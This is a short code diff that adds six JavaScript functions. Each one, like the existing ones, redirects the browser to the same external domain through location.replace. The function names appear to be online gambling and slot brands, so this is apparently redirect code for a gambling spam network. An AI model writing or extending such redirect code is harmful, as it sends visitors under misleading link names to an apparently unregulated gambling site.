@@ -1,4 +1,10 @@
 function link(){location.replace("https://qqbos99u9.com/");}
+function linkspesial303(){location.replace("https://qqbos99u9.com/");}
+function linkkoin313(){location.replace("https://qqbos99u9.com/");}
+function linkslotoppo88(){location.replace("https://qqbos99u9.com/");}
+function linkpepe77(){location.replace("https://qqbos99u9.com/");}
+function linkarobet88(){location.replace("https://qqbos99u9.com/");}
+function linkpusaka787(){location.replace("https://qqbos99u9.com/");}
 function linkhedon77(){location.replace("https://qqbos99u9.com/");}
 function linklanjut88(){location.replace("https://qqbos99u9.com/");}
 function linkgaulbet77(){location.replace("https://qqbos99u9.com/");}
